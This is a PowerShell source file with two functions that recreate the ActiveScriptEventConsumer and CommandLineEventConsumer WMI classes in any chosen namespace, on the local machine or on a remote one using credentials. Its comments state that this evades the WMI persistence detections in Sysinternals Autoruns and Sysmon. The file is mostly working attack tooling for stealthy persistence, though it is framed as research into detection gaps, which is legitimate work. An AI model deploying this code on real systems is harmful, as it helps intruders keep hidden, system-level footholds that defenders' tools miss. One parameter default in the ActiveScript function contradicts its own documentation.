function New-ActiveScriptEventConsumerClass {
<#
.SYNOPSIS

Creates an ActiveScriptEventConsumer WMI class in the namespace of your choosing.

.DESCRIPTION

New-ActiveScriptEventConsumerClass creates a clone of the ActiveScriptEventConsumer WMI event consumer class using the class name and namespace name of your choosing.

The purpose of New-ActiveScriptEventConsumerClass is to highlight the difficulty of developing robust WMI persistence detections. Previously, it was assumed that ActiveScriptEventConsumer classes could only exist in the root/subscription and root/default namespaces. New-ActiveScriptEventConsumerClass proves that this is indeed not the case.

As of this writing, New-ActiveScriptEventConsumerClass bypasses both Sysinternals Autoruns and Sysmon WMI persistence detections. This technique will still be caught with event ID 5861 in the Microsoft-Windows-WMI-Activity/Operational event log (Win 10+).

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause

.PARAMETER Namespace

Specifies the namespace within the root namespace where the class will live. If the namespace already exists, it will create the class within that namespace (with the exception of root/subscription and root/default).

.PARAMETER ClassName

Specifies the name of the ActiveScriptEventConsumer class to create. A class name of ActiveScriptEventConsumer will be used my default.

.PARAMETER Credential

Specifies a user account that has permission to perform this action. The default is the current user. Type a user name, such as User01, Domain01\User01, or User@Contoso.com. Or, enter a PSCredential object, such as an object that is returned by the Get-Credential cmdlet. When you type a user name, you are prompted for a password.

.PARAMETER ComputerName

Specifies the target computer for the management operation. Enter a fully qualified domain name (FQDN), a NetBIOS name, or an IP address. When the remote computer is in a different domain than the local computer, the fully qualified domain name is required.

.EXAMPLE

New-ActiveScriptEventConsumerClass -Namespace Foo -ClassName Blah

Description
-----------
An ActiveScriptEventConsumer class will be created as the 'Blah' class in the 'root/Foo' namespace. WMI persistence will now be possible in the 'root/Foo' namespace, evading Sysinternals.

.EXAMPLE

New-ActiveScriptEventConsumerClass -Namespace Foo -ClassName Blah -Credential TestUser -ComputerName 192.168.1.24

.EXAMPLE

$NewActiveScriptEventConsumer = Get-WmiObject -Namespace root/Foo -Class Meta_Class -Filter "__CLASS = 'Blah'"
$NewActiveScriptEventConsumer.Delete()

Get-CimInstance -Namespace root/Foo -ClassName __Win32Provider -Filter 'Name = "Blah"' | Remove-CimInstance
Get-CimInstance -Namespace root -ClassName __NAMESPACE -Filter 'Name = "Foo"' | Remove-CimInstance

Description
-----------
An example of cleaning up the class and namespace that was created in the previous example.

.OUTPUTS

System.Management.ManagementClass

Outputs the class definition of the new ActiveScriptEventConsumer class.
#>

    [OutputType([System.Management.ManagementClass])]
    [CmdletBinding(DefaultParameterSetName = 'NotRemote')]
    param (
        [Parameter(Mandatory = $True, ParameterSetName = 'Remote')]
        [Parameter(Mandatory = $True, ParameterSetName = 'NotRemote')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Namespace,

        [Parameter(ParameterSetName = 'Remote')]
        [Parameter(ParameterSetName = 'NotRemote')]
        [String]
        [ValidateNotNullOrEmpty()]
        $ClassName = 'CommandLineEventConsumer',

        [Parameter(Mandatory = $True, ParameterSetName = 'Remote')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential,

        [Parameter(Mandatory = $True, ParameterSetName = 'Remote')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName
    )

    $HadError = $False

    if (($Namespace -eq 'subscription') -or ($Namespace -eq 'default')) {
        Write-Error "New-ActiveScriptEventConsumerClass does not work with the root/subscription and root/default namespaces."
        $HadError = $True
    }

    $ExistingClass = $null

    $OptionalWMIArgs = @{}

    if ($Credential -and $ComputerName) {
        $OptionalWMIArgs['Credential'] = $Credential
        $OptionalWMIArgs['ComputerName'] = $ComputerName
    }

    try {
        $ExistingClass = Get-WmiObject -Namespace "root\$($Namespace)" -Class Meta_Class -Filter "__CLASS = '$ClassName'" @OptionalWMIArgs -ErrorAction SilentlyContinue
    } catch { }

    if ($ExistingClass) {
        Write-Error "WMI class root\$($Namespace):$ClassName already exists."
        $HadError = $True
    }

    if (-not $HadError) {
        $ExistingNamespace = Get-WmiObject -Namespace ROOT -Class __NAMESPACE -Filter "Name = '$Namespace'" -ErrorAction SilentlyContinue @OptionalWMIArgs

        if (-not $ExistingNamespace) {
            # Create a new namespace using the namespace name supplied
            $NewNamespace = Set-WmiInstance -Namespace ROOT -Class __NAMESPACE -Arguments @{ Name = $Namespace } -ErrorAction Stop @OptionalWMIArgs
        }
        
        
        # Derive the ActiveScriptEventConsumer in the specified namespace
        $EventConsumerBase = Get-WmiObject -Namespace "root\$($Namespace)" -Class Meta_Class -Filter "__CLASS = '__EventConsumer'" @OptionalWMIArgs
        # Derive the new ActiveScriptEventConsumer class. Upon creating the class, it will inherit the following properties:
        #  * CreatorSID
        #  * MachineName
        #  * MaximumQueueSize
        $NewActiveScriptEventConsumer = $EventConsumerBase.Derive($ClassName)

        # Mirror all the properties and respective qualifiers for ActiveScriptEventConsumer
        # scrcons.mof for reference/comparison:
        <#
        class ActiveScriptEventConsumer : __EventConsumer
        {
          [key] string Name;
          [not_null, write] string ScriptingEngine;
          [write] string ScriptText;
          [write] string ScriptFilename;
          [write] uint32 KillTimeout = 0;
        };
        #>

        $NewActiveScriptEventConsumer.Properties.Add('Name', [Management.CimType]::String, $False)
        $NewActiveScriptEventConsumer.Properties['Name'].Qualifiers.Add('key', $True, $False, $True, $True, $False)

        $NewActiveScriptEventConsumer.Properties.Add('ScriptingEngine', [Management.CimType]::String, $False)
        $NewActiveScriptEventConsumer.Properties['ScriptingEngine'].Qualifiers.Add('not_null', $True, $False, $False, $False, $True)
        $NewActiveScriptEventConsumer.Properties['ScriptingEngine'].Qualifiers.Add('write', $True, $False, $False, $False, $True)

        $NewActiveScriptEventConsumer.Properties.Add('ScriptText', [Management.CimType]::String, $False)
        $NewActiveScriptEventConsumer.Properties['ScriptText'].Qualifiers.Add('write', $True, $False, $False, $False, $True)

        $NewActiveScriptEventConsumer.Properties.Add('ScriptFilename', [Management.CimType]::String, $False)
        $NewActiveScriptEventConsumer.Properties['ScriptFilename'].Qualifiers.Add('write', $True, $False, $False, $False, $True)

        $NewActiveScriptEventConsumer.Properties.Add('KillTimeout', [Management.CimType]::UInt32, $False)
        $NewActiveScriptEventConsumer.Properties['KillTimeout'].Qualifiers.Add('write', $True, $False, $False, $False, $True)

        # Bake in the new type
        $null = $NewActiveScriptEventConsumer.Put()

        # ActiveScriptEventConsumer now needs to be bound to its provider
        # scrcons.mof for reference/comparison:
        <#
        Instance of __Win32Provider as $SCRCONS_P
        {
          Name = "ActiveScriptEventConsumer";
          Clsid = "{266c72e7-62e8-11d1-ad89-00c04fd8fdff}";
          PerUserInitialization = TRUE;
          HostingModel = "SelfHost";

        };
        #>
        $NewActiveScriptEventConsumerProviderBinding = Set-WmiInstance -Namespace "ROOT/$Namespace" -Class __Win32Provider -Arguments @{
            Name = $ClassName
            Clsid = '{266c72e7-62e8-11d1-ad89-00c04fd8fdff}'
            PerUserInitialization = $True
            HostingModel = 'SelfHost'
        } @OptionalWMIArgs

        # Perform the final event consumer consumer to provider binding
        # scrcons.mof for reference/comparison:
        <#
        Instance of __EventConsumerProviderRegistration
        {
          Provider = $SCRCONS_P;
          ConsumerClassNames = {"ActiveScriptEventConsumer"};
        };
        #>

        $EventConsumerProviderRegistration = Set-WmiInstance -Namespace "ROOT/$Namespace" -Class __EventConsumerProviderRegistration -Arguments @{
            provider = $NewActiveScriptEventConsumerProviderBinding
            ConsumerClassNames = @($ClassName)
        } @OptionalWMIArgs

        Get-WmiObject -Namespace "root\$($Namespace)" -Class Meta_Class -Filter "__CLASS = '$ClassName'" @OptionalWMIArgs
    }
}

function New-CommandLineEventConsumerClass {
<#
.SYNOPSIS

Creates a CommandLineEventConsumer WMI class in the namespace of your choosing.

.DESCRIPTION

New-CommandLineEventConsumerClass creates a clone of the CommandLineEventConsumer WMI event consumer class using the class name and namespace name of your choosing.

The purpose of New-CommandLineEventConsumerClass is to highlight the difficulty of developing robust WMI persistence detections. Previously, it was assumed that CommandLineEventConsumer classes could only exist in the root/subscription and root/default namespaces. New-CommandLineEventConsumerClass proves that this is indeed not the case.

As of this writing, New-CommandLineEventConsumerClass bypasses both Sysinternals Autoruns and Sysmon WMI persistence detections. This technique will still be caught with event ID 5861 in the Microsoft-Windows-WMI-Activity/Operational event log (Win 10+).

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause

.PARAMETER Namespace

Specifies the namespace within the root namespace where the class will live. If the namespace already exists, it will create the class within that namespace (with the exception of root/subscription and root/default).

.PARAMETER ClassName

Specifies the name of the CommandLineEventConsumer class to create. A class name of CommandLineEventConsumer will be used my default.

.PARAMETER Credential

Specifies a user account that has permission to perform this action. The default is the current user. Type a user name, such as User01, Domain01\User01, or User@Contoso.com. Or, enter a PSCredential object, such as an object that is returned by the Get-Credential cmdlet. When you type a user name, you are prompted for a password.

.PARAMETER ComputerName

Specifies the target computer for the management operation. Enter a fully qualified domain name (FQDN), a NetBIOS name, or an IP address. When the remote computer is in a different domain than the local computer, the fully qualified domain name is required.

.EXAMPLE

New-CommandLineEventConsumerClass -Namespace Foo -ClassName Blah

Description
-----------
A CommandLineEventConsumer class will be created as the 'Blah' class in the 'root/Foo' namespace. WMI persistence will now be possible in the 'root/Foo' namespace, evading Sysinternals.

.EXAMPLE

New-CommandLineEventConsumerClass -Namespace Foo -ClassName Blah -Credential TestUser -ComputerName 192.168.1.24

.EXAMPLE

$NewCommandLineEventConsumer = Get-WmiObject -Namespace root/Foo -Class Meta_Class -Filter "__CLASS = 'Blah'"
$NewCommandLineEventConsumer.Delete()

Get-CimInstance -Namespace root/Foo -ClassName __Win32Provider -Filter 'Name = "Blah"' | Remove-CimInstance
Get-CimInstance -Namespace root -ClassName __NAMESPACE -Filter 'Name = "Foo"' | Remove-CimInstance

Description
-----------
An example of cleaning up the class and namespace that was created in the previous example.

.OUTPUTS

System.Management.ManagementClass

Outputs the class definition of the new CommandLineEventConsumer class.
#>

    [OutputType([System.Management.ManagementClass])]
    [CmdletBinding(DefaultParameterSetName = 'NotRemote')]
    param (
        [Parameter(Mandatory = $True, ParameterSetName = 'Remote')]
        [Parameter(Mandatory = $True, ParameterSetName = 'NotRemote')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Namespace,

        [Parameter(ParameterSetName = 'Remote')]
        [Parameter(ParameterSetName = 'NotRemote')]
        [String]
        [ValidateNotNullOrEmpty()]
        $ClassName = 'CommandLineEventConsumer',

        [Parameter(Mandatory = $True, ParameterSetName = 'Remote')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential,

        [Parameter(Mandatory = $True, ParameterSetName = 'Remote')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName
    )

    $HadError = $False

    if (($Namespace -eq 'subscription') -or ($Namespace -eq 'default')) {
        Write-Error "New-CommandLineEventConsumerClass does not work with the root/subscription and root/default namespaces."
        $HadError = $True
    }

    $ExistingClass = $null

    $OptionalWMIArgs = @{}

    if ($Credential -and $ComputerName) {
        $OptionalWMIArgs['Credential'] = $Credential
        $OptionalWMIArgs['ComputerName'] = $ComputerName
    }

    try {
        $ExistingClass = Get-WmiObject -Namespace "root\$($Namespace)" -Class Meta_Class -Filter "__CLASS = '$ClassName'" @OptionalWMIArgs -ErrorAction SilentlyContinue
    } catch { }

    if ($ExistingClass) {
        Write-Error "WMI class root\$($Namespace):$ClassName already exists."
        $HadError = $True
    }

    if (-not $HadError) {
        $ExistingNamespace = Get-WmiObject -Namespace ROOT -Class __NAMESPACE -Filter "Name = '$Namespace'" -ErrorAction SilentlyContinue @OptionalWMIArgs

        if (-not $ExistingNamespace) {
            # Create a new namespace using the namespace name supplied
            $NewNamespace = Set-WmiInstance -Namespace ROOT -Class __NAMESPACE -Arguments @{ Name = $Namespace } -ErrorAction Stop @OptionalWMIArgs
        }
        
        
        # Derive the CommandLineEventConsumer in the specified namespace
        $EventConsumerBase = Get-WmiObject -Namespace "root\$($Namespace)" -Class Meta_Class -Filter "__CLASS = '__EventConsumer'" @OptionalWMIArgs
        # Derive the new CommandLineEventConsumer class. Upon creating the class, it will inherit the following properties:
        #  * CreatorSID
        #  * MachineName
        #  * MaximumQueueSize
        $NewCommandLineEventConsumer = $EventConsumerBase.Derive($ClassName)

        # Mirror all the properties and respective qualifiers for CommandLineEventConsumer
        # WBEMCons.mof for reference/comparison:
        <#
        class CommandLineEventConsumer : __EventConsumer
        {
          [key] string Name;
          [write] string ExecutablePath;
          [Template, write] string CommandLineTemplate;
          [write] boolean UseDefaultErrorMode = FALSE;
          [DEPRECATED] boolean CreateNewConsole = FALSE;
          [write] boolean CreateNewProcessGroup = FALSE;
          [write] boolean CreateSeparateWowVdm = FALSE;
          [write] boolean CreateSharedWowVdm = FALSE;
          [write] sint32 Priority = 32;
          [write] string WorkingDirectory;
          [DEPRECATED] string DesktopName;
          [Template, write] string WindowTitle;
          [write] uint32 XCoordinate;
          [write] uint32 YCoordinate;
          [write] uint32 XSize;
          [write] uint32 YSize;
          [write] uint32 XNumCharacters;
          [write] uint32 YNumCharacters;
          [write] uint32 FillAttribute;
          [write] uint32 ShowWindowCommand;
          [write] boolean ForceOnFeedback = FALSE;
          [write] boolean ForceOffFeedback = FALSE;
          [write] boolean RunInteractively = FALSE;
          [write] uint32 KillTimeout = 0;
        };
        #>

        $NewCommandLineEventConsumer.Properties.Add('Name', [Management.CimType]::String, $False)
        $NewCommandLineEventConsumer.Properties['Name'].Qualifiers.Add('key', $True, $False, $True, $True, $False)
        $NewCommandLineEventConsumer.Properties.Add('ExecutablePath', [Management.CimType]::String, $False)
        $NewCommandLineEventConsumer.Properties['ExecutablePath'].Qualifiers.Add('write', $True, $False, $False, $False, $True)
        $NewCommandLineEventConsumer.Properties.Add('CommandLineTemplate', [Management.CimType]::String, $False)
        $NewCommandLineEventConsumer.Properties['CommandLineTemplate'].Qualifiers.Add('Template', $True, $False, $False, $False, $True)
        $NewCommandLineEventConsumer.Properties['CommandLineTemplate'].Qualifiers.Add('write', $True, $False, $False, $False, $True)
        $NewCommandLineEventConsumer.Properties.Add('UseDefaultErrorMode', $False, [Management.CimType]::Boolean)
        $NewCommandLineEventConsumer.Properties['UseDefaultErrorMode'].Qualifiers.Add('write', $True, $False, $False, $False, $True)
        $NewCommandLineEventConsumer.Properties.Add('CreateNewConsole', $False, [Management.CimType]::Boolean)
        $NewCommandLineEventConsumer.Properties['CreateNewConsole'].Qualifiers.Add('DEPRECATED', $True, $False, $False, $False, $True)
        $NewCommandLineEventConsumer.Properties.Add('CreateNewProcessGroup', $False, [Management.CimType]::Boolean)
        $NewCommandLineEventConsumer.Properties['CreateNewProcessGroup'].Qualifiers.Add('write', $True, $False, $False, $False, $True)
        $NewCommandLineEventConsumer.Properties.Add('CreateSeparateWowVdm', $False, [Management.CimType]::Boolean)
        $NewCommandLineEventConsumer.Properties['CreateSeparateWowVdm'].Qualifiers.Add('write', $True, $False, $False, $False, $True)
        $NewCommandLineEventConsumer.Properties.Add('CreateSharedWowVdm', $False, [Management.CimType]::Boolean)
        $NewCommandLineEventConsumer.Properties['CreateSharedWowVdm'].Qualifiers.Add('write', $True, $False, $False, $False, $True)
        $NewCommandLineEventConsumer.Properties.Add('Priority', [Int32] 32, [Management.CimType]::SInt32)
        $NewCommandLineEventConsumer.Properties['Priority'].Qualifiers.Add('write', $True, $False, $False, $False, $True)
        $NewCommandLineEventConsumer.Properties.Add('WorkingDirectory', [Management.CimType]::String, $False)
        $NewCommandLineEventConsumer.Properties['WorkingDirectory'].Qualifiers.Add('write', $True, $False, $False, $False, $True)
        $NewCommandLineEventConsumer.Properties.Add('DesktopName', [Management.CimType]::String, $False)
        $NewCommandLineEventConsumer.Properties['DesktopName'].Qualifiers.Add('DEPRECATED', $True, $False, $False, $False, $True)
        $NewCommandLineEventConsumer.Properties.Add('WindowTitle', [Management.CimType]::String, $False)
        $NewCommandLineEventConsumer.Properties['WindowTitle'].Qualifiers.Add('Template', $True, $False, $False, $False, $True)
        $NewCommandLineEventConsumer.Properties['WindowTitle'].Qualifiers.Add('write', $True, $False, $False, $False, $True)
        $NewCommandLineEventConsumer.Properties.Add('XCoordinate', [Management.CimType]::UInt32, $False)
        $NewCommandLineEventConsumer.Properties['XCoordinate'].Qualifiers.Add('write', $True, $False, $False, $False, $True)
        $NewCommandLineEventConsumer.Properties.Add('YCoordinate', [Management.CimType]::UInt32, $False)
        $NewCommandLineEventConsumer.Properties['YCoordinate'].Qualifiers.Add('write', $True, $False, $False, $False, $True)
        $NewCommandLineEventConsumer.Properties.Add('XSize', [Management.CimType]::UInt32, $False)
        $NewCommandLineEventConsumer.Properties['XSize'].Qualifiers.Add('write', $True, $False, $False, $False, $True)
        $NewCommandLineEventConsumer.Properties.Add('YSize', [Management.CimType]::UInt32, $False)
        $NewCommandLineEventConsumer.Properties['YSize'].Qualifiers.Add('write', $True, $False, $False, $False, $True)
        $NewCommandLineEventConsumer.Properties.Add('XNumCharacters', [Management.CimType]::UInt32, $False)
        $NewCommandLineEventConsumer.Properties['XNumCharacters'].Qualifiers.Add('write', $True, $False, $False, $False, $True)
        $NewCommandLineEventConsumer.Properties.Add('YNumCharacters', [Management.CimType]::UInt32, $False)
        $NewCommandLineEventConsumer.Properties['YNumCharacters'].Qualifiers.Add('write', $True, $False, $False, $False, $True)
        $NewCommandLineEventConsumer.Properties.Add('FillAttribute', [Management.CimType]::UInt32, $False)
        $NewCommandLineEventConsumer.Properties['FillAttribute'].Qualifiers.Add('write', $True, $False, $False, $False, $True)
        $NewCommandLineEventConsumer.Properties.Add('ShowWindowCommand', [Management.CimType]::UInt32, $False)
        $NewCommandLineEventConsumer.Properties['ShowWindowCommand'].Qualifiers.Add('write', $True, $False, $False, $False, $True)
        $NewCommandLineEventConsumer.Properties.Add('ForceOnFeedback', $False, [Management.CimType]::Boolean)
        $NewCommandLineEventConsumer.Properties['ForceOnFeedback'].Qualifiers.Add('write', $True, $False, $False, $False, $True)
        $NewCommandLineEventConsumer.Properties.Add('ForceOffFeedback', $False, [Management.CimType]::Boolean)
        $NewCommandLineEventConsumer.Properties['ForceOffFeedback'].Qualifiers.Add('write', $True, $False, $False, $False, $True)
        $NewCommandLineEventConsumer.Properties.Add('RunInteractively', $False, [Management.CimType]::Boolean)
        $NewCommandLineEventConsumer.Properties['RunInteractively'].Qualifiers.Add('write', $True, $False, $False, $False, $True)
        $NewCommandLineEventConsumer.Properties.Add('KillTimeout', [UInt32] 0, [Management.CimType]::UInt32)
        $NewCommandLineEventConsumer.Properties['KillTimeout'].Qualifiers.Add('write', $True, $False, $False, $False, $True)

        # Bake in the new type
        $null = $NewCommandLineEventConsumer.Put()

        # CommandLineEventConsumer now needs to be bound to its provider
        # WBEMCons.mof for reference/comparison:
        <#
        Instance of __Win32Provider as $P2
        {
          Name = "CommandLineEventConsumer";
          Clsid = "{266c72e5-62e8-11d1-ad89-00c04fd8fdff}";
          HostingModel = "LocalSystemHost";

        };
        #>
        $NewCommandLineEventConsumerProviderBinding = Set-WmiInstance -Namespace "ROOT/$Namespace" -Class __Win32Provider -Arguments @{
            Name = $ClassName
            Clsid = '{266c72e5-62e8-11d1-ad89-00c04fd8fdff}'
            HostingModel = 'LocalSystemHost'
        } @OptionalWMIArgs

        # Perform the final event consumer consumer to provider binding
        # WBEMCons.mof for reference/comparison:
        <#
        Instance of __EventConsumerProviderRegistration
        {
          Provider = $P2;
          ConsumerClassNames = {"CommandLineEventConsumer"};
        };
        #>

        $EventConsumerProviderRegistration = Set-WmiInstance -Namespace "ROOT/$Namespace" -Class __EventConsumerProviderRegistration -Arguments @{
            provider = $NewCommandLineEventConsumerProviderBinding
            ConsumerClassNames = @($ClassName)
        } @OptionalWMIArgs

        Get-WmiObject -Namespace "root\$($Namespace)" -Class Meta_Class -Filter "__CLASS = '$ClassName'" @OptionalWMIArgs
    }
}
